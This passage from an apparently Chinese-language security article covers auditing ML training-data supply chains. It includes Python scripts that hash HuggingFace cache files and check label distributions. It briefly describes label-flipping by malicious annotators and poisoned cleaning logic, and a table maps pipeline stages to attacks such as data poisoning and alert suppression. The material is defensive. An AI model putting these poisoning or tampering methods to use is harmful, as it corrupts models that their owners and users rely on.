对公开数据集的安全审计是训练数据供应链取证的重要环节。HuggingFace Datasets 的缓存机制为取证分析提供了便利——所有下载的数据集片段都以 Arrow 格式缓存在本地，可以用于完整性验证。

```python
import hashlib
import os
import json

def audit_dataset_cache(cache_dir=None):
    if cache_dir is None:
        cache_dir = os.path.expanduser("~/.cache/huggingface/datasets")
    if not os.path.exists(cache_dir):
        print(f"[!] Cache directory not found: {cache_dir}")
        return
    print(f"[*] Auditing HuggingFace dataset cache: {cache_dir}")
    dataset_dirs = []
    for root, dirs, files in os.walk(cache_dir):
        arrow_files = [f for f in files if f.endswith('.arrow')]
        if arrow_files:
            dataset_dirs.append((root, arrow_files))
    print(f"[*] Found {len(dataset_dirs)} cached datasets")
    for root, arrow_files in dataset_dirs:
        rel_path = os.path.relpath(root, cache_dir)
        print(f"\n  Dataset: {rel_path}")
        total_size = 0
        for af in arrow_files:
            af_path = os.path.join(root, af)
            af_size = os.path.getsize(af_path)
            total_size += af_size
            sha256 = hashlib.sha256(open(af_path, 'rb').read()).hexdigest()
            print(f"    {af}: {af_size:,} bytes, SHA-256: {sha256[:16]}...")
        print(f"    Total size: {total_size:,} bytes ({total_size/1024/1024:.2f} MB)")

audit_dataset_cache()
```

### 数据标注环节的恶意操作

数据标注（Data Annotation）是训练数据供应链中最薄弱的环节之一。外包标注服务、众包平台和标注工具链都可能成为攻击者介入的切入点。恶意标注员可以在标注过程中系统性地翻转特定类别样本的标签，或者在特定区域添加微妙的修改。

**标注质量审计方法**：随机采样验证、交叉标注一致性分析、标注员行为模式分析（标注速度异常、特定类别的系统性偏差、标注时间分布异常）。

### 数据清洗与过滤阶段的安全审计

数据清洗（Data Cleaning）和过滤（Filtering）是训练数据预处理的关键环节。攻击者可能在此阶段注入恶意逻辑，使清洗过程选择性地保留投毒样本而过滤掉正常样本。

```python
import pandas as pd
import numpy as np
from collections import Counter

def audit_data_cleaning_pipeline(dataset_path, original_path=None):
    print(f"[*] Auditing data cleaning pipeline")
    if dataset_path.endswith('.csv'):
        cleaned_data = pd.read_csv(dataset_path)
    elif dataset_path.endswith('.jsonl'):
        cleaned_data = pd.read_json(dataset_path, lines=True)
    else:
        print(f"[!] Unsupported format: {dataset_path}")
        return
    print(f"[*] Cleaned dataset stats:")
    print(f"  Total samples: {len(cleaned_data)}")
    print(f"  Features: {list(cleaned_data.columns)}")
    label_col = None
    for col in cleaned_data.columns:
        if 'label' in col.lower() or 'class' in col.lower() or 'category' in col.lower():
            label_col = col
            break
    if label_col:
        label_dist = cleaned_data[label_col].value_counts()
        print(f"\n  Label distribution ({label_col}):")
        for label, count in label_dist.items():
            ratio = count / len(cleaned_data)
            print(f"    {label}: {count} ({ratio:.4f})")
    if original_path:
        if original_path.endswith('.csv'):
            original_data = pd.read_csv(original_path)
        else:
            original_data = pd.read_json(original_path, lines=True)
        removed_ratio = 1 - len(cleaned_data) / len(original_data)
        print(f"\n  Removed samples: {len(original_data) - len(cleaned_data)} ({removed_ratio:.4f})")
    numeric_cols = cleaned_data.select_dtypes(include=[np.number]).columns
    if len(numeric_cols) > 0:
        print(f"\n  Numeric feature statistics:")
        stats = cleaned_data[numeric_cols].describe()
        for col in numeric_cols:
            skewness = cleaned_data[col].skew()
            kurtosis = cleaned_data[col].kurtosis()
            if abs(skewness) > 2 or abs(kurtosis) > 7:
                print(f"    [!] {col}: skewness={skewness:.4f}, kurtosis={kurtosis:.4f} (anomalous)")

audit_data_cleaning_pipeline('train.csv', 'raw_train.csv')
```

---

## 0x06 ML Pipeline供应链攻击

### CI/CD Pipeline中的ML特有攻击面

ML 项目的 CI/CD Pipeline 与传统软件项目存在显著差异，引入了多个新的攻击面：

| Pipeline阶段 | ML特有组件 | 攻击手段 | MITRE技术 |
|-------------|-----------|---------|----------|
| 数据准备 | 数据下载脚本、数据验证 | 数据源劫持、数据投毒 | T1195.002 Supply Chain Compromise |
| 模型训练 | 训练脚本、超参搜索 | 训练过程篡改、GPU驱动劫持 | T1059.006 Python |
| 模型评估 | 评估指标计算、A/B测试 | 指标欺骗、评估集污染 | T1070.004 File Deletion |
| 模型注册 | Model Registry上传 | 模型替换、元数据篡改 | T1486 Data Encrypted for Impact |
| 模型部署 | 容器构建、推理服务 | 镜像投毒、配置篡改 | T1610 Deploy Container |
| 监控告警 | 模型漂移检测、异常告警 | 告警抑制、日志篡改 | T1562.001 Disable Tools |

### MLflow安全审计

MLflow 是最广泛使用的 ML 实验追踪平台，其安全配置直接影响整个 ML Pipeline 的安全性。

```bash
python3 <